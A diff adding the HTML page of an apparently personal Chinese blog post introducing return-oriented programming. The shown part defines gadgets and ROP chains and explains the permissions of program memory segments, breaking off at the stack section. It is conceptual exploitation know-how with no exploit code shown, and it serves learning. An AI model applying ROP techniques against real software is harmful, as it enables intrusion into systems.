@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="ROP链基础">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP链基础">
+<meta property="og:url" content="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Hanson&#39;s blog">
+<meta property="og:description" content="ROP链基础">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310134715459.png">
+<meta property="og:image" content="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310135448570.png">
+<meta property="og:image" content="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310142043170.png">
+<meta property="article:published_time" content="2026-03-11T08:04:15.000Z">
+<meta property="article:modified_time" content="2026-10-30T11:29:21.984Z">
+<meta property="article:author" content="Hanson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/image-20260310134715459.png">
+
+
+<link rel="canonical" href="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/","path":"2026/03/11/ROP链基础/","title":"ROP链基础"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ROP链基础 | Hanson's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","cdn":"https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hanson's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP%E9%93%BE%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">ROP链基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-ROP"><span class="nav-number">1.1.</span> <span class="nav-text">什么是 ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-Gadget"><span class="nav-number">1.2.</span> <span class="nav-text">什么是 Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-ROP-%E9%93%BE"><span class="nav-number">1.3.</span> <span class="nav-text">什么是 ROP 链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%85%B8%E5%9E%8B%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="nav-number">1.4.</span> <span class="nav-text">一个程序运行时的典型内存布局</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#text-%E6%AE%B5%EF%BC%88%E4%BB%A3%E7%A0%81%E6%AE%B5%EF%BC%89"><span class="nav-number">1.4.1.</span> <span class="nav-text">text 段（代码段）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rodata%EF%BC%88%E5%8F%AA%E8%AF%BB%E6%95%B0%E6%8D%AE%E6%AE%B5%EF%BC%89"><span class="nav-number">1.4.2.</span> <span class="nav-text">rodata（只读数据段）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-%E6%AE%B5%EF%BC%88%E5%B7%B2%E5%88%9D%E5%A7%8B%E5%8C%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%EF%BC%89"><span class="nav-number">1.4.3.</span> <span class="nav-text">data 段（已初始化全局变量）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bss-%E6%AE%B5%EF%BC%88%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%EF%BC%89"><span class="nav-number">1.4.4.</span> <span class="nav-text">bss 段（未初始化全局变量）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap%EF%BC%88%E5%A0%86%EF%BC%89"><span class="nav-number">1.4.5.</span> <span class="nav-text">heap（堆）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack%EF%BC%88%E6%A0%88%EF%BC%89"><span class="nav-number">1.4.6.</span> <span class="nav-text">stack（栈）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shared-libraries-mmap"><span class="nav-number">1.4.7.</span> <span class="nav-text">shared libraries &#x2F; mmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.8.</span> <span class="nav-text">完整权限总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="nav-number">1.4.9.</span> <span class="nav-text">用工具查看程序内存布局</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%AE%B0%E5%BF%86"><span class="nav-number">1.4.10.</span> <span class="nav-text">一句话记忆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99-bss-heap-stack-%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="nav-number">1.4.11.</span> <span class="nav-text">什么时候 bss &#x2F; heap &#x2F; stack 可以执行？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%83%85%E5%86%B51%EF%BC%9ANX%E5%85%B3%E9%97%AD"><span class="nav-number">1.4.11.1.</span> <span class="nav-text">情况1：NX关闭</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%83%85%E5%86%B52%EF%BC%9Amprotect-%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="nav-number">1.4.11.2.</span> <span class="nav-text">情况2：mprotect 修改权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%83%85%E5%86%B53%EF%BC%9Ammap-%E5%88%9B%E5%BB%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98"><span class="nav-number">1.4.11.3.</span> <span class="nav-text">情况3：mmap 创建可执行内存</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-NX"><span class="nav-number">1.5.</span> <span class="nav-text">什么是 NX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bin-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.6.</span> <span class="nav-text">&#x2F;bin 是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PLT%E4%B8%8EGOT"><span class="nav-number">1.7.</span> <span class="nav-text">PLT与GOT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT"><span class="nav-number">1.7.1.</span> <span class="nav-text">PLT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GOT"><span class="nav-number">1.7.2.</span> <span class="nav-text">GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PLT-GOT-%E5%A6%82%E4%BD%95%E9%85%8D%E5%90%88"><span class="nav-number">1.7.3.</span> <span class="nav-text">PLT + GOT 如何配合</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B0%83%E7%94%A8-puts-%E6%97%B6%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88"><span class="nav-number">1.7.3.1.</span> <span class="nav-text">第一次调用 puts 时发生什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%99%A8"><span class="nav-number">1.7.3.2.</span> <span class="nav-text">进入动态链接器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5-GOT"><span class="nav-number">1.7.3.3.</span> <span class="nav-text">写入 GOT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8-puts"><span class="nav-number">1.7.3.4.</span> <span class="nav-text">第二次调用 puts</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">1.7.3.5.</span> <span class="nav-text">完整流程图</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86"><span class="nav-number">1.8.</span> <span class="nav-text">ELF文件处理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%89%BE-PLT"><span class="nav-number">1.8.1.</span> <span class="nav-text">1 找 PLT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%89%BE-GOT"><span class="nav-number">1.8.2.</span> <span class="nav-text">2 找 GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%89%BE%E5%87%BD%E6%95%B0"><span class="nav-number">1.8.3.</span> <span class="nav-text">3 找函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.8.4.</span> <span class="nav-text">4 找字符串</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E4%BE%8B%E5%AD%90"><span class="nav-number">1.9.</span> <span class="nav-text">一些例子</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Hanson"
+      src="/images/dog.png">
+  <p class="site-author-name" itemprop="name">Hanson</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Hanson0512" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hanson0512" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2394056860@qq.com" title="E-Mail → mailto:2394056860@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/03/11/ROP%E9%93%BE%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dog.png">
+      <meta itemprop="name" content="Hanson">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ROP链基础 | Hanson's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ROP链基础
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-11 16:04:15" itemprop="dateCreated datePublished" datetime="2026-03-11T16:04:15+08:00">2026-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-30 19:29:21" itemprop="dateModified" datetime="2026-10-30T19:29:21+08:00">2026-10-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="ROP链基础"><a href="#ROP链基础" class="headerlink" title="ROP链基础"></a>ROP链基础</h1><span id="more"></span>
+<h2 id="什么是-ROP"><a href="#什么是-ROP" class="headerlink" title="什么是 ROP"></a>什么是 ROP</h2><!--more-->
+<p><strong>ROP = Return Oriented Programming</strong></p>
+<p>中文通常翻译为：</p>
+<p><strong>面向返回的编程</strong></p>
+<p>意思是：</p>
+<blockquote>
+<p><strong>利用程序中已有的代码片段，通过 <code>ret</code> 指令把它们串起来执行，从而完成我们想要的功能。</strong></p>
+</blockquote>
+<h2 id="什么是-Gadget"><a href="#什么是-Gadget" class="headerlink" title="什么是 Gadget"></a>什么是 Gadget</h2><!--more-->
+<p>ROP 的基本单位叫：</p>
+<p><strong>gadget</strong></p>
+<p>定义：</p>
+<blockquote>
+<p><strong>以 <code>ret</code> 结尾的一小段代码</strong></p>
+</blockquote>
+<h2 id="什么是-ROP-链"><a href="#什么是-ROP-链" class="headerlink" title="什么是 ROP 链"></a>什么是 ROP 链</h2><!--more-->
+<p><strong>ROP chain（ROP 链）</strong>：</p>
+<blockquote>
+<p><strong>一系列 gadget 按顺序排列在栈上形成的执行流程</strong></p>
+</blockquote>
+<p>ROP = 用栈控制 ret，让程序现有代码按照攻击者的顺序执行。</p>
+<h2 id="一个程序运行时的典型内存布局"><a href="#一个程序运行时的典型内存布局" class="headerlink" title="一个程序运行时的典型内存布局"></a>一个程序运行时的典型内存布局</h2><!--more-->
+<p>从低地址到高地址大致是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">低地址</span><br><span class="line">│</span><br><span class="line">│  text segment</span><br><span class="line">│  rodata</span><br><span class="line">│  data</span><br><span class="line">│  bss</span><br><span class="line">│</span><br><span class="line">│  heap  ↑</span><br><span class="line">│        ↑ 向高地址增长</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│</span><br><span class="line">│        ↓ 向低地址增长</span><br><span class="line">│  stack</span><br><span class="line">│</span><br><span class="line">│  mmap / shared libraries</span><br><span class="line">│</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>
+<p>可以简单记忆为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码 → 数据 → 堆 → 共享库 → 栈</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="text-段（代码段）"><a href="#text-段（代码段）" class="headerlink" title="text 段（代码段）"></a>text 段（代码段）</h3><!--more-->
+<p><strong>text segment</strong></p>
+<p>作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存放程序机器指令</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译后的汇编指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov</span><br><span class="line">add</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>都会在 <strong>text 段</strong>。</p>
+<p>典型权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r-x</span><br></pre></td></tr></table></figure>
+<p>意思：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read  ✓</span><br><span class="line">write ✗</span><br><span class="line">execute ✓</span><br></pre></td></tr></table></figure>
+<p>原因：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码可以执行，但不能被修改</span><br></pre></td></tr></table></figure>
+<p>否则攻击者可以直接改程序指令。</p>
+<hr>
+<h3 id="rodata（只读数据段）"><a href="#rodata（只读数据段）" class="headerlink" title="rodata（只读数据段）"></a>rodata（只读数据段）</h3><!--more-->
+<p><strong>read-only data</strong></p>
+<p>存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串常量</span><br><span class="line">const 变量</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot;</span><br></pre></td></tr></table></figure>
+<p>就存在 <strong>rodata</strong>。</p>
+<p>权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r--</span><br></pre></td></tr></table></figure>
+<p>意思：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可读</span><br><span class="line">不可写</span><br><span class="line">不可执行</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="data-段（已初始化全局变量）"><a href="#data-段（已初始化全局变量）" class="headerlink" title="data 段（已初始化全局变量）"></a>data 段（已初始化全局变量）</h3><!--more-->
+<p>存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化的全局变量</span><br><span class="line">初始化的 static 变量</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> y = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
+<p>这些变量在 <strong>data 段</strong>。</p>
+<p>权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw-</span><br></pre></td></tr></table></figure>
+<p>意思：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可读</span><br><span class="line">可写</span><br><span class="line">不可执行</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="bss-段（未初始化全局变量）"><a href="#bss-段（未初始化全局变量）" class="headerlink" title="bss 段（未初始化全局变量）"></a>bss 段（未初始化全局变量）</h3><!--more-->
+<p><strong>BSS = Block Started by Symbol</strong></p>
+<p>存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未初始化的全局变量</span><br><span class="line">未初始化的 static 变量</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> y;</span><br></pre></td></tr></table></figure>
+<p>这些在 <strong>bss</strong>。</p>
+<p>特点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序加载时自动初始化为0</span><br></pre></td></tr></table></figure>
+<p>权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw-</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="heap（堆）"><a href="#heap（堆）" class="headerlink" title="heap（堆）"></a>heap（堆）</h3><!--more-->
+<p>存放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态分配内存</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line"><span class="keyword">new</span></span><br></pre></td></tr></table></figure>
+<p>代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br></pre></td></tr></table></figure>
+<p><code>p</code> 指向的空间在 <strong>heap</strong>。</p>
+<p>特点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">向高地址增长</span><br></pre></td></tr></table></figure>
+<p>权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rw-</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="stack（栈）"><a href="#stack（栈）" class="headerlink" title="stack（栈）"></a>stack（栈）</h3><!--more-->
+<p>存放：</p>
